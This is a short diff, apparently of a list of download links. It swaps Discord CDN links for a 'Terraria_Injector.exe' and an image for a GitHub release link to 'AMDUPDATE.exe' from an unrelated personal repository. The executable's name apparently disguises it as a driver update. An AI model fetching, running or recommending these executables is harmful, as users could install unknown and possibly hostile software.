@@ -1,2 +1,1 @@
-https://cdn.discordapp.com/attachments/1145190422998683701/1462249443867889777/Terraria_Injector.exe?ex=696d816a&is=696c2fea&hm=02b624232b733ad0cc750020522b7d8aed5c4cc2853ff22ef2418722b49a3baf&
-https://cdn.discordapp.com/attachments/1145190422998683701/1462253216078106729/Untitled.png?ex=696d84ee&is=696c336e&hm=e4e173f04be6eff24030157ffb4f5bb0bfeee052589b5a40e6f3fa7df420c261&
+https://github.com/doomarhuhbruh-prog/sigma1/releases/download/v1/AMDUPDATE.exe
